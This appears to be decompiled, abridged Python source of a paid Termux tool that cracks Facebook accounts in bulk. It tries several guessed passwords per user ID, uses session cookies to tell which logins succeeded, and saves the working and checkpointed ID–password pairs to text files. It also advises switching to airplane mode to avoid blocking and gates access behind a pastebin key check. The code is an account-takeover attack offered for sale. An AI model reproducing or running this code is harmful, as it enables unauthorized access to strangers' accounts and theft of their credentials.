...
# Embedded file name: <HAROON PATHAAN>
...
logo = "'\n\x1b[1;91m' ##:::'##:'##::::'##::::'###::::'##::: ##:\n'\x1b[1;92m'##::'##:: ##:::: ##:::'## ##::: ###:: ##:\n'\x1b[1;91m'##:'##::: ##:::: ##::'##:. ##:: ####: ##:\n'\x1b[1;97m'#####:::: #########:'##:::. ##: ## ## ##:\n'\x1b[1;93m'##. ##::: ##.... ##: #########: ##. ####:\n'\x1b[1;94m'##:. ##:: ##:::: ##: ##.... ##: ##:. ###:\n'\x1b[1;92m'##::. ##: ##:::: ##: ##:::: ##: ##::. ##:\n'\x1b[1;91m'..::::..::..:::::..::..:::::..::..::::..::\n\t\n'\x1b[1;92m'   Author      :     HAROON KHAN     \n'\x1b[1;91m'   Github      :     Haroon302  \n'\x1b[1;96m'   FB ID       :     Nothing\n'\x1b[1;93m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;91m'   WAP NUMBER  :     +923494462675            \n"
dec = '2'
server = '2'
...
def main_apv():
    ...
    try:
        ...
        os.system('clear')
        print logo
        print '           HAROON PAID TOOL'
        print '           PAID RS.350 EASYPAISA Thanks'
        print '           If you dont have subscription'
        print '           Then please contact with ADMIN Thanks'
        print '           FOR Subscription Press ENTER'
        print '           and Contact with Whatsapp THANKS'
        print ''
        ...
        kok.close()
        print ''
        print '           That is your KEY '
        print '           Copy KEY and send to ADMIN'
        print ''
        print ''
        print ''
        print '             IF your subscription is DONE then'
        raw_input('  Exit Termux and re-open it and put COMMONDS again Thanks')
        os.system('xdg-open https://wa.me/+923494462675')

    r1 = requests.get('https://pastebin.com/raw/K03Mz36u').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        ...
        print '           HAROON PAID TOOL'
        print '           PAID RS.350 EASYPAISA Thanks'
        print '           If you dont have subscription then please '
        print '           Then please contact with ADMIN Thanks'
        print '           FOR Subscription Press ENTER'
        print '           and Contact with Whatsapp THANKS'
        print ''
...
def main_input():
    ...
    if mx == '1':
        ...
        print '        Member of Haroon Paid Commands '
        print '        ENJOY  KRO BROTHERS '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('https://raw.githubusercontent.com/pathan1/pay/main/yes.txt')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[HAROON-OK] ' + coc + user + ' | ' + pass1
                ok = open('HAROON-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[HAROON-CP] ' + coc + user + ' | ' + pass1
                cp = open('HAROON random-co.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def fb_menu():
    ...
    if cz == '1':
        print ''
        print '\x1b[1;91m      [ Public Cloning HAROON Pro ]'
        print ''
        ...
        print ''
        print '\x1b[1;92m      [ Public Cloning HAROON Fast ]'
        print ''
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[HAROON-OK] ' + uid + ' | ' + pass1
                ok = open('HAROON-OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[HAROON-CP] ' + uid + ' | ' + pass1
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[HAROON-OK] ' + uid + ' | ' + pass2
                    ok = open('HAROON-OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[HAROON-CP] ' + uid + ' | ' + pass2
                    cp = open('HAROON-CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[HAROON-OK] ' + uid + ' | ' + pass3
                        ok = open('HAROON-OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[HAROON-CP] ' + uid + ' | ' + pass3
                        cp = open('HAROON-CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[HAROON-OK] ' + uid + ' | ' + pass4
                            ok = open('HAROON-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[HAROON-CP] ' + uid + ' | ' + pass4
                            cp = open('HAROON-CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[HAROON-OK] ' + uid + ' | ' + pass5
                                ok = open('HAROON-OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[HAROON-CP] ' + uid + ' | ' + pass5
                                cp = open('HAROON-CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
...
def n_p_pass():
    ...
    os.system('echo " -----------------------------------"| lolcat')
    print '        Cracking Start Please Wait .. '
    print ' Agar Idz Nhi Aa Rahe To (Airplane) Flight ModE Use Kro'
    os.system('echo " -----------------------------------"| lolcat')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;97m[HARON-CP] ' + uid + ' | ' + pass1
                cp = open('HAROON-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;92m[HAROON-CP] ' + uid + ' | ' + pass4
                            cp = open('HAROON-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[HAROON-OK] ' + uid + ' | ' + pass6
                                    ok = open('HAROON-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;97m[HAROON-CP] ' + uid + ' | ' + pass6
                                    cp = open('HAROON-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
